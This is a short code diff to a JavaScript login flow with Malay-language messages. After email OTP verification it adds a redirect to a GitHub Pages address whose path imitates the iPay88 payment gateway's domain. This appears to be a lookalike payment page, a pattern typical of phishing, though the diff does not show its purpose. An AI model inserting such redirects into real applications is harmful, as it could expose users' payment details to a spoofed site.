@@ -79,6 +79,8 @@ async function verifyEmailOTP() {
     console.log("Email OTP Login berjaya:", data);
 
     alert("Email berjaya disahkan!");
+    
+    window.location.href = "https://duitjom.github.io/payment.ipay88.com";
 
     // Contoh: pergi ke halaman seterusnya
     // window.location.href = "customer-info.html";
